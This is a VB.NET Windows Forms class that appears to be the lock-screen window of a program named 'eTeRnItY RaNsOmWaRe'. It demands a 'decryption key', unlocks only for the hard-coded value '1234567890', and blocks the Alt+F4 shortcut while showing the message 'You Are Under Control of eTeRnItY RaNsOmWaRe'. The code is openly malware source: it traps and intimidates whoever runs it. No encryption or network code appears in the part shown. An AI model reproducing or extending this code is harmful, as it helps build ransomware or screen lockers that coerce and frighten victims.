Public Class Form3

    Private Sub PictureBox1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox1.Click

        If TextBox1.Text = "1234567890" Then
            Form4.Show()
            Me.Hide()
            My.Computer.Audio.Stop()

        Else
            MessageBox.Show("Enter Your Decryption Key", "", MessageBoxButtons.OK, MessageBoxIcon.Error)
            TextBox1.Text = ""

        End If
    End Sub

    Private Sub TextBox1_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles TextBox1.KeyDown
        If e.KeyData = Keys.Alt + Keys.F4 Then
            MessageBox.Show("You Are Under Control of eTeRnItY RaNsOmWaRe", "", MessageBoxButtons.OK, MessageBoxIcon.Hand)
            e.Handled = True

        End If
    End Sub

    Private Sub Form3_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

    End Sub
End Class